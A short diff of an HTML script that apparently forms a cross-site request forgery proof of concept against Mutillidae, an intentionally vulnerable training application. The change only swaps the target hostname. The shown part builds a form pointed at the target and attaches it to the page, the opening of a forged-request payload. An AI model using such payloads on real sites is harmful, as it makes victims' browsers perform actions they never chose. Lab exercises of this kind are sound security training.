@@ -1,7 +1,7 @@
 <script>
 function sendcsrf(){
 	var lForm = document.createElement("FORM");
-	lForm.action="http://mutillidae.local/index.php";
+	lForm.action="http://mutillidae.localhost/index.php";
 	lForm.method = "GET";
 	lForm.enctype="application/x-www-form-urlencoded";
 	document.body.appendChild(lForm);
